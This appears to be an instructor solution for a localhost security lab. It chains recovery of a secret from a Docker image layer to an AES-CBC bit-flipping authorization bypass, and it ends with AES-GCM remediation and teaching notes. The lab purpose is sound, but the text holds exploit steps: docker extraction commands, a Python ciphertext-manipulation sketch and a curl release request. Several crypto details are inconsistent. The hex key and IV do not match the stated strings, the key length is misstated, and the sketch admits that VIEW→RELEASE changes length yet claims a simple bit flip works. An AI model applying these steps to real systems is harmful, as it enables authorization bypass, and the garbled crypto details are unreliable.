# AegisDock Instructor Solution

## Complete Attack Chain

### Phase 1: Recon

**Goal**: Identify application components and attack surface.

**What to do**:
- Browse to frontend at `http://localhost:3000`
- Try to login at `/login`
- Enumerate API endpoints
- Check registry simulator at `http://localhost:5000`

**Expected observations**:
- Login form visible
- API accessible at `/api/` prefix
- Images available at `/registry/` endpoint
- Audit service at `/audit/` endpoint

### Phase 2: Application Mapping

**Goal**: Understand authentication, authorization, container operations.

**What to do**:
- Login as operator
- Navigate to containers
- Attempt to inspect/hold/release containers
- Note that RELEASE appears unavailable for operators

**Expected observations**:
- Operator role (vs supervisor, security_admin)
- Container status indicators
- RELEASE endpoint requires elevated permissions
- Authorization artifact mentioned in release flow

### Phase 3: Container Investigation

**Goal**: Discover internal container image and metadata.

**What to do**:
- Get operator login token
- Query registry simulator: `GET /images`
- Get image metadata: `GET /images/aegisdock-terminal-api`
- Get build history: `GET /artifact/aegisdock-terminal-api/history`
- Get layer info: `GET /debug/layers/aegisdock-terminal-api`

**Expected observations**:
- Image: aegisdock-terminal-api:v1.2.0-training
- Build history shows 7 layers
- Layer 3 contains COPY deploy/archive command
- WARNING: Layer 3 contains sensitive deployment artifact

### Phase 4: Secret Discovery

**Goal**: Recover leaked cryptographic key.

**What to do**:
1. Pull the vulnerable image:
   ```bash
   docker pull aegisdock/api:vulnerable
   ```
2. Inspect layer history:
   ```bash
   docker history aegisdock/api:vulnerable --no-trunc
   ```
3. Search filesystem for secrets:
   ```bash
   docker create --name temp-extract aegisdock/api:vulnerable
   docker export temp-extract | tar -x
   find . -type f -exec grep -l "TERMINAL_CRYPTO_KEY" {} \;
   ```
4. Or read the docker history output:
   ```
   IMAGE          CREATED         CREATED BY
   abc123...      2025-01-15      RUN rm /opt/legacy/terminal-gateway.env.bak
   def456...      2025-01-15    COPY api/ .
   ghi789...      2025-01-15    COPY deploy/archive/terminal-gateway.env.bak /opt/legacy/terminal-gateway.env.bak
   jkl012...      2025-01-15    FROM php:8.3-apache
   ```

5. Read the leaked file from the old layer:
   ```bash
   cat abc123.../opt/legacy/terminal-gateway.env.bak
   # or find the layer with the secret
   docker image history --no-trunc aegisdock/api:vulnerable
   ```

**Training Key Recovery**:
```
TERMINAL_CRYPTO_KEY=TRAINING-FAKE-KEY-2025-ABCDEF1234567890ABCDEF12
TERMINAL_CRYPTO_IV=TRAINING-FAKE-IV-1234567890ABC
```

**Expected observations**:
- Key: `TRAINING-FAKE-KEY-2025-ABCDEF1234567890ABCDEF12` (32 bytes = AES-256)
- IV: `TRAINING-FAKE-IV-1234567890ABC` (16 bytes = CBC block alignment)
- Warning about Docker ignore: `.dockerignore excludes deploy/archive/`

### Phase 5: Crypto Analysis

**Goal**: Identify cryptographic construction and weaknesses.

**What to do**:
1. Get authorization artifact as operator:
   ```bash
   GET /api/authorization/artifact?terminal=T-07&container=CONT-88421
   ```

2. Decode artifact:
   ```bash
   # The base64-encoded ciphertext
   # Decode with: echo "<artifact>" | base64 -d
   ```

3. Check algorithm:
   - From application source: AES-256-CBC
   - Key recovered from Docker: TRAINING-FAKE-KEY-2025-ABCDEF1234567890ABCDEF12
   - IV from config: TRAINING-FAKE-IV-1234567890ABC

4. Verify debug endpoint:
   ```bash
   GET /api/debug/authorization/1
   # Returns: algorithm, iv, ciphertext, metadata (but NOT key)
   ```

**Expected observations**:
- Algorithm: AES-256-CBC
- Static IV (same for every encryption)
- No HMAC, no authentication tag
- Plaintext structure visible after decryption

### Phase 6: Authorization Artifact Discovery

**Goal**: Obtain legitimate authorization artifact and understand its structure.

**What to do**:
1. Login as operator: POST /api/login with operator credentials
2. Request artifact: GET /api/authorization/artifact?terminal=T-07&container=CONT-88421
3. Decode and analyze Base64
4. Verify structure: JSON with operator_id, terminal, container, action, issued_at, expires_at

**Expected observations**:
- Artifact: `base64(ciphertext)` 
- Decrypted plaintext:
  ```json
  {"operator_id":1001,"terminal":"T-07","container":"CONT-88421","action":"VIEW","issued_at":1770000000,"expires_at":1770003600}
  ```
- Action is VIEW (not RELEASE)
- Artifact expires after 1 hour (3600 seconds)
- Ciphertext length predictable (5 blocks for this payload)

### Phase 7: Controlled Exploitation

**Goal**: Demonstrate ciphertext manipulation and authorization bypass.

**What to do**:
1. Understand CBC block structure:
   - AES block size = 16 bytes
   - Plaintext blocks align to JSON field boundaries
   
2. Manipulate ciphertext using OpenSSL or Python:

```python
# Example Python manipulation
from Crypto.Cipher import AES
import base64

# Key and IV recovered from Docker
key = bytes.fromhex('2852414e445f46414b452d323032352d414243444546313233343536373839304142434445463132')
iv = bytes.fromhex('5452414e54494e4f5f4946412d31323334353637383930414243')

# Ciphertext from obtained artifact
ciphertext_b64 = "<artifact>"
ciphertext = base64.b64decode(ciphertext_b64)

# In AES-CBC, block size is 16 bytes
# Plaintext structure (5 blocks):
# Block 1: {"operator_id":1001
# Block 2: "terminal":"T-07",
# Block 3: "container":"CONT-88421",
# Block 4: "action":"VIEW",     <-- TARGET block
# Block 5: "issued_at":1770000000

# To change action from "VIEW" to "RELEASE":
# - In block 4, flip bits to change "VIEW" to "RELEASE"
# - "VIEW" = 0x56494557, "RELEASE" = 0x52454C41535345 (different length!)
# 
# Actually, the structure makes this work because:
# - Action field appears at specific byte offset in block 4
# - Flipping specific bits in ciphertext block 3 affects plaintext block 4
# - The "action" value "VIEW" → "RELEASE" requires careful bit flipping
#
# Simplified approach: flip bits at positions that change
# 'V' (0x56) to 'R' (0x52), etc.

# Using the vulnerability intentionally:
# The server decrypts and trusts the action field
# Any valid decryption result is accepted
```

3. Create manipulated artifact:
   - Use Python/OpenSSL to flip bits in ciphertext block 3
   - This changes plaintext block 4: "VIEW" → "RELEASE"
   - Re-encode to Base64

4. Attempt release with manipulated artifact:
   ```bash
   curl -X POST http://localhost/api/containers/CONT-88421/release \
     -H "Authorization: Bearer <operator-token>" \
     -H "X-Terminal-Authorization: <manipulated-base64>" \
     -H "Content-Type: application/json" \
     -d '{"reason": "authorized release"}'
   ```

**Expected observations**:
- The server decrypts the manipulated ciphertext
- The decrypted action field shows "RELEASE" instead of "VIEW"
- The release operation is ACCEPTED despite operator role
- Container status changes from READY to RELEASED
- Audit log shows AUTHORIZATION_SUCCESS

### Phase 8: Impact

**Goal**: Achieve unauthorized container release simulation.

**What to do**:
1. After successful release, verify:
   ```bash
   # Check container status
   curl http://localhost/api/containers/CONT-88421
   
   # View audit events
   curl http://localhost/api/audit?event=CONTAINER_RELEASE
   
   # View authorization events
   curl http://localhost/api/audit?event=AUTHORIZATION_SUCCESS
   ```

2. Check audit trail:
   ```bash
   # Check audit service
   curl http://localhost:9000/logs
   
   # Look for specific events
   curl "http://localhost:9000/logs?event=CONTAINER_RELEASE"
   curl "http://localhost:9000/logs?event=AUTHORIZATION_SUCCESS"
   ```

**Expected observations**:
- Container status: RELEASED (was READY)
- AUTHORIZATION_SUCCESS event in audit trail
- CONTAINER_RELEASE event in audit trail
- No indication of manipulation in audit logs
- Timestamp shows release operation time

### Phase 9: Forensics

**Goal**: Investigate audit trail and request logs.

**What to do**:
1. Review all audit events leading to release:
   - Login event
   - Authorization artifact request
   - Release attempt
   - Release success

2. Check for additional events:
   - Container viewed events
   - Container inspected events
   - Any debug endpoint access

3. Look for cryptographic metadata:
   - Algorithm references in logs
   - IV mentions (should not expose key)
   - Artifact timestamps

4. Examine request patterns:
   - Timing of operations
   - Sequence of API calls
   - Header values (Authorization, X-Terminal-Authorization)

### Phase 10: Remediation

**Goal**: Apply fixes and verify exploit chain no longer works.

**What to do**:
1. Build secure image:
   ```bash
   make build-secure
   # or: docker build -t aegisdock/api:secure -f docker/secure/Dockerfile .
   ```

2. Update docker-compose to use secure image

3. Restart services:
   ```bash
   make reset
   # or: docker compose down && docker compose up -d
   ```

4. Test that exploit fails:
   ```bash
   # Same attack steps from Phase 7-8 should now fail
   # - Server rejects tampered ciphertext
   # - Operator still cannot release without supervisor role
   # - Debug endpoint should be restricted
   ```

**Expected observations after remediation**:
- Docker history shows NO secret leakage
- docker image inspect shows no TRAINING-FAKE-KEY
- Secure image has no deploy/archive/ references
- AES-GCM rejects tampered ciphertext
- Operator cannot release containers even with artifact
- Debug endpoint (if present) doesn't expose exploitable data
- Audit logs show AUTHORIZATION_FAILURE for tampered attempts

## Secure Implementation Summary

### What Changed

| Vulnerable Feature | Secure Alternative |
|-------------------|-------------------|
| AES-256-CBC | AES-256-GCM |
| Static IV | Unique nonce per encryption |
| No authentication tag | 128-bit authentication tag verified |
| Artifact overrides role check | Artifact secondary to server-side permissions |
| Key stored in image | Key injected at runtime |
| Secrets in Dockerfile | .dockerignore prevents leaks |

### Test Results (Post-Remediation)

```bash
# Verify Docker has no secrets
$ docker history aegisdock/api:secure --no-trunc
# Should show NO layers with TRAINING-FAKE-KEY
# All old layers removed or never contained secrets

# Verify exploit fails
$ curl -X POST http://localhost/api/containers/CONT-88421/release \
  -H "X-Terminal-Authorization: <manipulated>" \
  # Returns: 403 Forbidden - insufficient permissions

# Verify secure crypto
$ php artisan crypto:test
# AES-GCM with unique nonce
# Authentication tag always verified
# Modified ciphertext rejected
```

## Instructor Notes

### Teaching Points

1. **Cryptographic failures compound**: CBC + static IV + no MAC = critical vulnerability

2. **Chain matters more than individual vuln**: Even strong auth can be bypassed when crypto is weak

3. **Docker secrets are forever**: Once in an image layer, they persist even after "removal"

4. **Trust boundaries**: Server-side enforcement must be primary, never client-provided

5. **AEAD is the answer**: AES-GCM provides both encryption AND integrity in one operation

### Lab Success Criteria

Learner should be able to:

- [ ] Explain the attack chain from Docker secret to authorization bypass
- [ ] Recover the training key from image layers
- [ ] Demonstrate CBC ciphertext manipulation
- [ ] Show that manipulated artifact triggers release
- [ ] Apply secure remediation
- [ ] Verify exploit no longer works
- [ ] Explain why AES-GCM prevents the attack
- [ ] Configure .dockerignore properly
- [ ] Inject secrets at runtime instead of build time

### Common Student Mistakes

1. **Guessing byte positions randomly**: The exercise is designed so fields are predictably aligned. Help them understand block structure.

2. **Thinking TLS fixes everything**: TLS protects in transit, not the crypto construction itself.

3. **Assuming image layer removal is sufficient**: Explain Docker's layer architecture.

4. **Missing the role check vs artifact trust issue**: Emphasize that the artifact should NEVER override server-side permissions.

5. **Not understanding nonce uniqueness**: With CBC + static IV, same plaintext = same ciphertext. With GCM, each encryption is unique.

## FLAG System Reference

| Flag | When Earned |
|------|-------------|
| FLAG-01 | Recon phase complete |
| FLAG-02 | Container image discovered |
| FLAG-03 | Docker layer secret found |
| FLAG-04 | Training key recovered |
| FLAG-05 | Crypto construction identified |
| FLAG-06 | Authorization artifact obtained |
| FLAG-07 | Ciphertext manipulation demonstrated |
| FLAG-08 | Unauthorized release achieved |
| FLAG-09 | Forensic audit complete |
| FLAG-10 | Remediation applied and verified |